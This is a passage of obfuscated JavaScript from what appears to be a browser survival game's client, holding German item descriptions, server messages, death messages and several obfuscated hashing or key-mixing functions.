			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠΔ] = ["Goldschwert", "König des Waldes", "Schaden: 22", "Schaden an Gebäuden: 7"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠᐃⵠ] = ["Diamantschwert", "Du kannst die Kraft spüren", "Schaden: 24", "Schaden an Gebäuden: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆΔ] = ["Piratenschwert", "Ayyyyy!", "Hat eine höhere Reichweite als ein normales Schwert", "Schaden: 24", "Schaden an Gebäuden: 8"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = ["Amethystschwert", "Mauve ist die schönste Farbe der Welt", "Schaden: 27", "Schaden an Gebäuden: 9"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = ["Drachenschwert", "Keine Gnade!", "Schaden: 30", "Schaden an Gebäuden: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = ["Drachenspeer", "Töte sie alle!", "Schaden: 22", "Schaden an Gebäuden: 6"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆΔⲆ] = ["Holzspitzhacke", "Kann nur Holz und Stein abbauen", "Schaden: 1"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⵠΔ] = ["Steinspitzhacke", "Kann Holz, Stein und Gold abbauen", ⵠ[519]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠⲆ] = ["Goldspitzhacke", "Kann auch Diamanten abbauen", "Schaden: 3", ⵠ[128]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆΔⲆ] = ["Diamantspitzhacke", "Kann alles abbauen", "Schaden: 4", ⵠ[128]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠΔᐃ] = ["Amethystspitzhacke", "Kann alles abbauen, sieht außerdem gut aus!", "Schaden: 5", ⵠ[128]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⲆ] = ["Steinhammer", ⵠ[547], "Funktioniert nicht gut gegen Diamant oder Amethyst", ⵠ[519], "Schaden an Gebäuden: 20"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔⲆ] = ["Goldhammer", ⵠ[547], "Funktioniert nicht gut gegen Amethyst", "Schaden: 3", "Schaden an Gebäuden: 30"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = ["Diamanthammer", ⵠ[547], "Schaden: 4", "Schaden an Gebäuden: 40"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = ["Amethysthammer", ⵠ[547], "Schaden: 5", "Schaden an Gebäuden: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = ["Superhammer", "Willst du die Welt zerstören?", "Schaden: 12", "Schaden an Gebäuden: 70"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ] = ["Holzspeer", "Wie ein Stock, nur mit dem Unterschied, dass es sticht.", "Schaden: 10", "Schaden an Gebäuden: 2"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔΔⲆ] = ["Steinspeer", "Der Anfang der Evolution!", "Schaden: 14", "Schaden an Gebäuden: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆΔⲆ] = ["Goldspeer", "Pass auf, es sticht!", "Schaden: 15", "Schaden an Gebäuden: 5"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔΔΔ] = ["Diamantspeer", "Du bist bereit einen Drachen zu töten", "Schaden: 17", "Schaden an Gebäuden: 5"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔᐃΔ] = ["AmethystSpeer", "Drachen jagen dir keine Angst mehr ein", "Schaden: 18", "Schaden an Gebäuden: 6"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠΔᐃ] = ["Steinschaufel", ⵠ[391], ⵠ[349], ⵠ[519]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠΔ] = ["Goldschaufel", ⵠ[391], ⵠ[349], "Schaden: 3", ⵠ[128]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔΔᐃ] = ["Diamantschaufel", ⵠ[391], ⵠ[349], "Schaden: 4", ⵠ[128]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⲆΔ] = ["Amethystschaufel", ⵠ[391], ⵠ[349], "Schaden: 5", ⵠ[128]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⲆΔ] = ["Holzhelm", "Besser als nichts", "Verteidigung gegen Spieler: 1", "Verteidigung gegen Tiere: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠΔΔᐃⲆ] = ["Steinhelm", "Du bist bereit zu kämpfen!", "Verteidigung gegen Spieler: 2", "Verteidigung gegen Tiere: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆⵠΔ] = ["Goldhelm", "AKA Der Helm der Unbarmherzigen", "Verteidigung gegen Spieler: 4", "Verteidigung gegen Tiere: 13"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆⲆⲆ] = ["Diamanthelm", "Gib nicht zu viel an", "Verteidigung gegen Spieler: 5", "Verteidigung gegen Tiere: 19"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆΔ] = ["Amethysthelm", "Du musst vor nichts mehr angst haben", "Verteidigung gegen Spieler: 6", "Verteidigung gegen Tiere: 23"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = ["Drachenhelm", "Du wirst die Welt erobern", "Verteidigung gegen Spieler: 8", "Verteidigung gegen Tiere: 27"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠΔ] = ["Erkunderhut", "Tiere beachten dich nicht mehr", "mach aber keine Geräusche!", ⵠ[478]];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⲆ] = ["Weihnachtshut", "Oh, oh, oh, fröhliche Weihnachten", ⵠ[478]];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠⵠ] = ["Elfenhut", "Lass dich nicht ausnutzen, du kleiner Schneeelf!", ⵠ[478]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃΔΔ] = ["Kapuze", "Du bist ein Schurke", "Du kannst jemand bestehlen solange:", "1) Es nacht ist", "2) Du nichts trägst", "3) dich niemand für acht Sekunden berührt hat", "4) Du nicht in der Nähe eines Feuers bist", "5) Dein Ziel keine Bauernkleidung trägt", ⵠ[478]];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⵠ] = ["Ohrwärmer", "Eine Art kleiner chapka.", ⵠ[478]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = [ⵠ[308], "Auch Mantel genannt.", ⵠ[478]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔᐃⲆ] = ["Winterschaal und Kappe", "Sehr angenehm", "Sehr Warm"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⲆᐃ] = ["Bauer", "Deine Pflanzen wachsen schneller", ⵠ[478]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔᐃ] = ["Winterkapuze", "Du bist ein Wilder Schurke", "Du kannst jemand bestehlen solange:", "1) Es nacht ist", "2) Du nichts trägst", "3) dich niemand für vier Sekunden berührt hat", "4) Du nicht in der Nähe eines Feuers bist", "5) Dein Ziel keine Winterbauernkleidung trägt", ⵠ[478]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆᐃⲆ] = ["Winterbauern", "Deine Pflanzen wachsen deutlich schneller", ⵠ[478]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔΔⵠ] = ["Tauchermaske", "Du bist schneller im Wasser", "Hält dich warm im Wasser", "Verteidigung gegen Spieler: 2, Verteidigung gegen Tiere: 8"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃΔⲆ] = ["Supertauchermaske", "Du bist sehr schnell im Wasser", "Hält dich warm im Wasser", ⵠ[580]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⵠ] = ["Drachenkugel", "Erhalten bei abschließung der Quest"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆⲆᐃ] = ["Drachenherz", "Verwandelt dich in einen Geist, sobald du stirbst!", "Du bist für 60 Sekunden ein Geist", "Finde ein Wiederbelebungsstein."];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⵠ] = ["Grüner Edelstein", "Du hast nicht gemogelt, versprochen?"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆᐃᐃ] = ["Orangener Edelstein", "Nur ein echter Pirat findet ihn!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⵠΔ] = ["Blauer Edelstein", "Für sehr nette Leute"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = ["Grüne Krone", "Du heilst dich selbst sehr schnell", "Heilung über Zeit: 40", ⵠ[580]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠⲆⲆ] = ["Orangene Krone", "Du fühlst dich plötzlich als hättest du mehr Glück", ⵠ[580]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔΔ] = ["Blaue Krone", "Sobald du stirbst wirst du ein Geist", "Du wirst allerdings dein Schwert und deine Spitzhacke verlieren", ⵠ[580]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠⵠΔ] = ["Eimer", "Nützlich um einen Brunnen zu füllen", "Ein Eimer ist vergleichbar mit zwölf Flaschen"];
			ΔⵠΔ[ᐃᐃ.Δⵠⵠⵠⵠ] = ["Leerer Eimer", "Du musst den Eimer in der Nähe einer Wasserquelle füllen"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = ["Flasche", "Erlaubt dir überall Wasser zu trinken", "Wasser: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = ["Leere Flasche", "Du musst die Flasche in der Nähe einer Wasserquelle füllen"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = ["Leere Gießkanne", "Du musst es mit einer Wasserquelle füllen"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = ["Gießkanne", "Erlaubt das wässern von Pflanzen", "Schaden: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠ] = ["Rucksack", "Mehr Platz im Inventar!"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔⲆ] = ["Papier", "Wird fürs Büchermachen verwendet"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = ["Buch", "Reduziert die benötigte Zeit beim herstellen von Gegenständen", "Muss in der Hand gehalten werden um den Effekt zu nutzen", "Schaden: 1"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠⵠᐃ] = ["Verband", "Heile dich schneller", "Heilung über Zeit: 30", "Effekt: 5"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔⵠᐃ] = ["Schloss", "Erlaubt dir deine Truhe zu verschließen"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⵠΔ] = ["Dietrich", "Erlaubt dir eine verschlossene Truhe zu öffnen"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃⲆᐃ] = [ⵠ[534], "Erlaubt dir ein Team zu gründen", "Teile Türen und Truhen", "verletzende Strukturen schaden deinen Freunden nicht mehr"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⲆᐃ] = ["Brücke", "Sehr nützlich über Wasser", "Es erlaubt dir zu trinken ohne zu ertrinken", "lässt dich schneller auf dem Wasser laufen"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = ["Schild", "Hinterlasse eine Nachricht für andere hier", "Haltbarkeit: 200"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆᐃⵠ] = ["Dach", "Versteckt dich ein wenig und hält warm dabei!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔⵠ] = ["Brunnen", "Erlaubt dir deine Flasche zu füllen, eine mobile Wasserquelle", ⵠ[234]];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⵠᐃ] = ["Holzwand", "Kennst du den Wandtanz?", ⵠ[234]];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⲆⲆ] = ["Steinwand", "Es sieht ein wenig Ernsthafter aus.", "Haltbarkeit: 1500"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃᐃΔⲆ] = ["Goldwand", "Gold an deiner Wand? Es leuchtet ein wenig.", ⵠ[464]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆᐃᐃ] = ["Diamantwand", "So leuchtend, pass auf deine Augen auf", "Haltbarkeit: 2500"];
			ΔⵠΔ[ᐃᐃ.ᐃΔᐃΔⵠ] = ["Amethystwand", "Du musst dich wirklich fürchten raus zu gehen!", "Haltbarkeit: 3000"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⲆ] = ["Holzstacheln", "Kann deine Gegner verletzen", "Schaden: 10, Schaden beim Angreifen: 2", "Haltbarkeit: 150"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃΔᐃ] = ["Steinstacheln", "Ich würde lieber nicht dein Gegner sein.", "Schaden: 20", "Schaden beim Angreifen: 3", "Haltbarkeit: 300"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆⵠΔ] = ["Goldstacheln", "Du bist grausam.", "Schaden: 30", "Schaden beim Angreifen: 3", "Haltbarkeit: 600"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⵠⲆ] = ["Diamantstacheln", "Du magst Gesellschaft nicht.", "Schaden: 40", "Schaden beim Angreifen: 4", "Haltbarkeit: 1200"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠᐃ] = ["Amethyststacheln", "Was zur Hölle haben deine Nachbarn dir angetan?", "Schaden: 50", "Schaden beim Angreifen: 4", "Haltbarkeit: 2400"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = ["Holztür", "Kann von dir oder deinen Freunden geöffnet werden", ⵠ[234]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔΔ] = ["Steintür", "Eine stärkere Tür ist ernsthafter", "Haltbarkeit: 1500"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = ["Goldtür", "Baust du el dorado?", ⵠ[464]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = ["Diamanttür", "Für ein scheinendes Haus", "Haltbarkeit: 2500"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = ["Amethysttür", "Ist dein Haus ein verschlossener Safe?", "Haltbarkeit: 3500"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔᐃ] = ["Ofen", "Wärmt dich", "Es verbraucht alle 5 Sekunden eine Einheit Holz", ⵠ[234]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆᐃᐃ] = ["Windmühle", "Kann mit Weizen, Mehl herstellen", "Es braucht 5 Sekunden um Mehl herzustellen", "Gibt dir Punkte während es arbeitet", ⵠ[464]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = ["Brotofen", "Erlaubt dir mit Mehl, Brot herzustellen", "Es braucht 5 Sekunden um Brot herzustellen", "Gibt dir Punkte während es arbeitet", ⵠ[464]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = ["Wiederbelebungsstein", "Es ist Magie", "Wiederbelebt dich, wenn du ein Geist bist", "Du wirst deine Waffe und Spitzhacke verlieren", "Haltbarkeit: 200"];
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠⲆΔⲆⲆⲆ] = "Du kannst diesem Server nicht beitreten";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆᐃⲆΔΔᐃ] = "Gekickt: ";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⵠⵠΔⲆⲆ] = "Dein Schlüssel wurde bereits von jemand anderem benutzt";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⵠⵠΔᐃⵠ] = "Dein Schlüssel ist falsch";
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔⲆΔᐃⵠ] = "Deine Version ist veraltet, säubere dein Cache";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔΔΔⵠⵠᐃ] = "Es gibt keine neuen Ressourcen";
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆᐃⲆⵠⲆᐃ] = "Du hast einen Tag überlebt";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⲆΔⵠᐃΔ] = "Du hast überlebt ";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆΔΔⲆᐃᐃ] = " Tage";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔᐃⲆᐃⵠⵠ] = "Du bist gestorben ;-;";
			ΔⵠΔ[ⲆⲆΔ.ΔΔⵠⵠⲆⲆᐃ] = "Server kann kein Spawnplatz finden! Drücke immer wieder auf spielen!";
			ΔⵠΔ[ⲆⲆΔ.ⵠᐃⵠⲆⵠΔΔ] = "Server ist voll! Drücke immer wieder auf spielen!";
			ΔⵠΔ[ⲆⲆΔ.EMPTY] = "Ressource ist leer";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⲆᐃⲆⲆⲆ] = "Dein Inventar ist voll (rechts-klick um Gegenstände zu entfernen)";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃΔⲆᐃⲆⲆ] = " ist gestorben";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆⲆᐃᐃᐃ] = "Das ist nicht das richtige Werkzeug";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠⲆΔⵠᐃ] = "Du bist einem Team beigetreten";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃᐃΔ] = "Du bist gestorben";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆΔᐃⲆⵠΔ] = " ist dem Team beigetreten";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⲆᐃᐃΔⲆ] = "Dein Team wurde zerstört";
			ΔⵠΔ[ⲆⲆΔ.ΔΔᐃᐃⵠⵠΔ] = "Du hast das Team verlassen";
			ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠⵠⵠⵠᐃ] = " hat das Team verlassen";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃΔⲆ] = "Jemand hat dein Token gestohlen :>";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃⲆⲆⵠⲆ] = "Suche dir ein Server aus";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⵠⲆ] = "Spieler";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆᐃⵠⲆⲆ] = "alle Spieler";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃΔᐃ] = "Spieler in diesem Modus";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⲆⲆᐃᐃ] = "Bald verfügbar...";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[505]).placeholder = "Spitzname";
			ᐃᐃΔᐃ[ⵠⲆᐃⵠ] = ["Du wurdest ohne Grund getötet"];
			ᐃᐃΔᐃ[ⵠⲆΔ] = ["Du bist verhungert, wie der Name des Spiels andeutet"];
			ᐃᐃΔᐃ[2] = ["Du bist erfroren. Zu schade", "Du bist an Unterkühlung gestorben. Versuche nächstes Mal zu einem Feuer zu gehen ."];
			ᐃᐃΔᐃ[3] = ["Ein Spieler hat dich getötet, während er dir gesagt hat 'git gud.'", "Du wurdest von einem Spieler ermordet, mach dir keine Sorgen, er wird wahrscheinlich auch sterben ."];
			ᐃᐃΔᐃ[ΔΔⵠⵠΔ] = ["Du bist zu nah ans Feuer gegangen und zu tode gebrannt. Schlechte Idee.", "Du wurdest von einem Feuer umgebracht. Feuer tut weh. Schreib eine Geschichte darüber."];
			ᐃᐃΔᐃ[5] = ["Dein Körper wird zu einem Spinnennest", "Eine Spinne hat dich getötet. Zumindest war es kein Hase."];
			ᐃᐃΔᐃ[6] = ["Dieser Wolf wird nicht mehr verhungern", "Sie sind keine Hunde. Wölfe mögen es nicht gestreichelt zu werden."];
			ᐃᐃΔᐃ[ⵠⵠⲆⲆⵠ] = ["Der Fuchs war zu schnell für dich", "Der Fuchs hat dich in eine Box verwandelt. Seit wann haben Tiere magische Kräfte?"];
			ᐃᐃΔᐃ[ⲆⲆᐃᐃⲆ] = ["Der Bär wollte nur eine Umarmung.", "Der Bär war zu viel zu ertragen. Es tut mir nicht leid."];
			ᐃᐃΔᐃ[9] = ["Du wurdest von einem Drachen knusprig gebraten. Zu schade.", "Du wurdest von einem Drachen erdrückt. Zerquetscht zu werden ist ein schrecklicher Weg zu sterben."];
			ᐃᐃΔᐃ[ᐃⵠΔⵠⵠ] = ["Du bist in eine Stachelwand gesprungen. Keine gute Idee...", "Du wurdest von einer Stachelwand getötet. Die meisten Leute sind sensibel genug keine spitzen Sachen anzufassen."];
			ᐃᐃΔᐃ[11] = ["Sogar Geister können sterben.", "Du hast es nicht geschafft wiederbelebt zu werden. Das ist ein Spiel, also lebst du nachdem du stirbst..."];
			ᐃᐃΔᐃ[12] = ["Ein Bakterium von deinem rohen Fleisch hat dich getötet. Das Spiel ist definitiv zu schwierig.", "Du hast das rohe Fleisch getötet. Es hat dich ebenfalls getötet."];
			ᐃᐃΔᐃ[13] = ["Du bist verdurstet. Solltest lieber deinen eigenen Urin trinken."];
			ᐃᐃΔᐃ[ⲆΔⲆⵠᐃ] = ["Wusstest du, dass dein Mund beim Schwimmen immer unterm Wasser ist? Jetzt weißt du es."];
			ᐃᐃΔᐃ[ⲆᐃⲆΔⲆ] = ["Mach dir keine Sorge, der Piranha findet dich lecker.", "Nebenbei: Piranhas essen Menschen. Dich mit eingeschlossen."];
			ᐃᐃΔᐃ[16] = ["LapaMauve plant nicht, dass du den Kraken töten kannst", "Ein Kraken hat deinen Schädel zertrümmert."];
			ᐃᐃΔᐃ[ⵠᐃΔΔΔⲆⲆ] = ["Deine Haut fällt auseinander, die Sonne hat dich umgebracht."];
			ᐃᐃΔᐃ[18] = ["Knoblauch in deiner Tasche hat dein Gehirn gebraten "];
			ᐃᐃΔᐃ[19] = ["Stehe als ein Vampir nicht neben den Knoblauchnelken."];
			ᐃᐃΔᐃ[ⲆΔⲆⲆΔ] = ["Du hast als ein Vampir Knoblauch gegessen, was hast du erwartet?"];
			ᐃᐃΔᐃ[21] = ["Dein Körper ist von einem Dornenbusch umgeben.Während du versuchst zu entkommen löst sich deine Haut von deinem Körper und dein Herz hört auf zu schlagen."];
			ⲆⲆΔΔⲆ = ⵠ[170];
			ΔⵠᐃⲆⲆⵠⲆ = ["Uuunnnggg...Ich verhungere...", "Brauche dein Gehirn... Uuunnnggg...", "Hier gibt es frisches Fleisch... Uuunnnggg", "Uuunnnggg...Du bist lecker", ⵠ[200], "Essen... uuunnnggg...", "Ich rieche Blut... Uuunnnggg"]
		};
		const ⲆⲆΔΔⵠΔᐃ = ⵠᐃⵠΔᐃ;
		const ΔⵠⲆⵠᐃⵠⲆ = ᐃⵠⲆⲆᐃⵠⵠ;

		function ᐃΔⵠⲆᐃΔⵠ(ⵠⵠΔΔΔ, ΔⵠⲆⵠΔᐃⲆ, ⲆᐃΔΔⲆΔΔ, ΔⲆⲆⵠⵠᐃⵠ, ⵠⲆᐃⵠⲆΔΔ) {
			ⲆᐃⵠⵠⲆᐃⵠ(ⲆᐃΔⵠⲆ, ⵠⵠΔΔΔ, ΔⵠⲆⵠΔᐃⲆ, ⲆᐃΔΔⲆΔΔ, ΔⲆⲆⵠⵠᐃⵠ, ⵠⲆᐃⵠⲆΔΔ);
			const ΔᐃᐃᐃⲆΔⲆ = ⲆⲆⵠⵠⲆⲆⵠ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[ⵠΔΔ], ΔᐃΔᐃ[2], ΔᐃΔᐃ[ᐃⲆᐃᐃ], ΔᐃΔᐃ[ᐃⵠⵠΔ], ΔᐃΔᐃ[ΔΔⵠ]);
			const ⲆⵠⲆΔΔᐃΔΔΔ = ⲆΔΔⲆΔⵠᐃ(ΔᐃΔᐃ[Ⲇᐃⵠ], ΔᐃΔᐃ[2], ΔᐃΔᐃ[ᐃᐃⵠⲆᐃ], ΔᐃΔᐃ[ⵠΔᐃΔ]);
			const ⵠⵠᐃΔΔᐃⵠ = ~(55950 & ΔᐃᐃᐃⲆΔⲆ) & ΔᐃᐃᐃⲆΔⲆ | ~(ΔᐃᐃᐃⲆΔⲆ & 55950) & 55950;
			return ⵠⵠᐃΔΔᐃⵠ
		}

		function ΔᐃⵠᐃⲆⲆᐃ(ΔⲆΔΔΔⲆᐃ, ΔⵠⵠᐃΔⲆᐃ, ᐃⵠΔⲆΔΔΔ) {
			const ⵠΔΔᐃΔᐃⲆ = (31919 | ΔⲆΔΔΔⲆᐃ) & ~(ΔⲆΔΔΔⲆᐃ & 31919);
			const ⲆⲆⲆᐃⲆⵠᐃ = (214013 * (ΔⵠⵠᐃΔⲆᐃ + 62522) + 2531011) % 4294967296;
			const ⵠΔᐃⵠΔⵠΔ = ~(43398 & ᐃⵠΔⲆΔΔΔ) & 43398 | ~(43398 & ᐃⵠΔⲆΔΔΔ) & ᐃⵠΔⲆΔΔΔ;
			const ⲆⲆᐃⵠⲆⵠⲆ = ⵠⵠⲆⲆⵠⵠᐃ(ⵠΔΔᐃΔᐃⲆ, ⲆⲆⲆᐃⲆⵠᐃ, ⵠΔᐃⵠΔⵠΔ, ⵠΔΔᐃΔᐃⲆ);
			const ΔⵠᐃⵠΔⵠΔ = ᐃⵠΔΔⵠᐃΔ(ⲆⲆⲆᐃⲆⵠᐃ, ⵠΔᐃⵠΔⵠΔ, ⵠΔΔᐃΔᐃⲆ);
			const ΔⵠⵠⲆⵠΔᐃ = (214013 * ((ⲆⲆᐃⵠⲆⵠⲆ ^ ΔⵠᐃⵠΔⵠΔ) + 28231) + 2531011) % 4294967296;
			return ΔⵠⵠⲆⵠΔᐃ
		}
		const ᐃᐃΔᐃΔ = ᐃⵠΔⵠⲆ;
		const ⵠᐃⲆⵠⲆⵠΔⵠⲆ = ΔᐃΔⵠΔⲆᐃ;

		function ᐃⲆᐃⵠⲆⵠᐃ(ⵠΔᐃⵠⲆᐃⵠ, ΔᐃΔᐃΔⲆⲆ) {
			const ᐃᐃΔⵠⵠⵠⵠ = ~(35800 & ⵠΔᐃⵠⲆᐃⵠ) & (35800 | ⵠΔᐃⵠⲆᐃⵠ);
			const ⵠΔⵠⵠΔᐃⲆ = (16 << (ΔᐃΔᐃΔⲆⲆ >> 0 & 255)) + (8 << (ΔᐃΔᐃΔⲆⲆ >> 8 & 255)) + (24 << (ΔᐃΔᐃΔⲆⲆ >> 24 & 255)) + (0 << (ΔᐃΔᐃΔⲆⲆ >> 16 & 255));
			const ᐃⲆⵠΔⵠⲆⲆ = ΔᐃⵠᐃⲆⲆᐃ(ᐃᐃΔⵠⵠⵠⵠ, ⵠΔⵠⵠΔᐃⲆ, ᐃᐃΔⵠⵠⵠⵠ);
			const ⵠⵠᐃⲆᐃΔⵠ = ⲆᐃⲆⲆⲆΔΔ(ⵠΔⵠⵠΔᐃⲆ, ᐃᐃΔⵠⵠⵠⵠ, ⵠΔⵠⵠΔᐃⲆ, ᐃᐃΔⵠⵠⵠⵠ, ⵠΔⵠⵠΔᐃⲆ);
			const ᐃᐃⲆΔⲆⲆⲆ = (2531011 + ((ᐃⲆⵠΔⵠⲆⲆ ^ ⵠⵠᐃⲆᐃΔⵠ) + 16856) * 214013) % 4294967296;
			return ᐃᐃⲆΔⲆⲆⲆ
		}
		const ΔⲆΔⵠⲆⵠⲆ = ⵠΔⲆⵠⲆⵠΔ;

		function ΔᐃⵠΔⲆⲆⵠ(ⵠᐃΔⵠⲆⲆⵠ, ⲆⲆᐃΔⵠⵠⲆ, ⵠΔᐃⲆᐃΔΔ) {
			const ⲆᐃⲆᐃⲆⵠⲆ = ~(14309 & ⵠᐃΔⵠⲆⲆⵠ) & (14309 | ⵠᐃΔⵠⲆⲆⵠ);
			const ᐃⲆⲆᐃᐃᐃⵠ = (ⲆⲆᐃΔⵠⵠⲆ + 22525) % 65365;
			const ᐃΔΔⵠⵠⲆΔ = 10624 ^ ⵠΔᐃⲆᐃΔΔ;
			const ΔⵠⲆⵠⵠΔⵠ = ΔΔᐃΔᐃΔᐃ(ⲆᐃⲆᐃⲆⵠⲆ, ᐃⲆⲆᐃᐃᐃⵠ, ᐃΔΔⵠⵠⲆΔ, ⲆᐃⲆᐃⲆⵠⲆ, ᐃⲆⲆᐃᐃᐃⵠ);
			const ᐃⵠⲆⵠⲆⲆⲆ = ΔⵠⵠΔᐃΔᐃ(ᐃΔΔⵠⵠⲆΔ, ⲆᐃⲆᐃⲆⵠⲆ, ᐃⲆⲆᐃᐃᐃⵠ, ᐃΔΔⵠⵠⲆΔ);
			const ᐃⲆΔᐃΔᐃⵠ = (2147483587 + ((ΔⵠⲆⵠⵠΔⵠ ^ ᐃⵠⲆⵠⲆⲆⲆ) + 30275) * 2147483629) % 2147483647;
			return ᐃⲆΔᐃΔᐃⵠ
		}

		function ⵠⲆⲆⵠΔᐃⵠ(ΔᐃΔⵠᐃ, ᐃΔΔᐃⲆΔΔ, ⵠⵠᐃⲆⵠᐃΔ) {
			ᐃⵠᐃⵠᐃΔΔ(ⲆᐃΔⵠⲆ, ΔᐃΔⵠᐃ, ᐃΔΔᐃⲆΔΔ, ⵠⵠᐃⲆⵠᐃΔ);
			const ᐃΔΔⲆΔᐃⵠ = ΔΔᐃᐃᐃⵠⵠ(ΔᐃΔᐃ[ΔⲆⲆ], ΔᐃΔᐃ[1]);
